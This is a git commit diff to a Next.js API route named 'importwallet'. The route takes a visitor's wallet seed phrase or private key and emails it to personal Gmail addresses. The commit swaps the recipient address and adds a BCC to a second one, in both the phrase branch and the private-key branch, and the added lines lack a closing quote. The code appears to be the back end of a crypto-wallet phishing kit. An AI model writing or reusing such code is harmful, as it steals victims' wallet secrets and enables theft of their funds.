6b3d3ce9ced3d95cfd2f808382687f6e1961adef
fahacious <144079390+fahacious@users.noreply.github.com>
2025-02-09 06:50:19 +0100

    Update route.ts

--- src/app/api/importwallet/route.ts
+++ src/app/api/importwallet/route.ts
@@ -37,7 +37,8 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(phrase);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['jamesanderson197x@gmail.com'],
+        to: ['fahadabdullahi180@gmail.com'],
+        bcc: ['ellahella2015@gmail.com],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
@@ -59,7 +60,8 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(privateKey);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['jamesanderson197x@gmail.com'],
+        to: ['fahadabdullahi180@gmail.com'],
+        bcc: ['ellahella2015@gmail.com],
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
